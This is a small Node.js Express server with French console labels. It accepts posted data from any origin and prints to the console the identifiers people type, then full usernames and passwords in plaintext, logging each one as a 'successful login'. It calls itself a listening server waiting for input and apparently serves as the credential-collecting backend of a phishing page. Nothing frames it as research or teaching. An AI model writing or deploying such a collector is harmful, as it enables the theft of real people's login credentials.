const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

app.post('/api/log-data', (req, res) => {
  const data = req.body;
  
  console.log("\n========================================");
  console.log(`[${new Date().toLocaleTimeString()}] NOUVELLE ACTION`);
  
  if (data.type === "IDENTIFIANT") {
    console.log(`📍 IDENTIFIANT SAISI : ${data.value}`);
  } else if (data.type === "LOGIN_COMPLET") {
    console.log(`👤 USER : ${data.user}`);
    console.log(`🔑 PASS : ${data.pass}`);
    console.log(`✅ TENTATIVE DE CONNEXION RÉUSSIE`);
  }
  
  console.log("========================================\n");
  res.sendStatus(200);
});

app.listen(5000, () => {
  console.log("🚀 SERVEUR D'ÉCOUTE LANCÉ SUR http://localhost:5000");
  console.log("En attente de saisies...");
});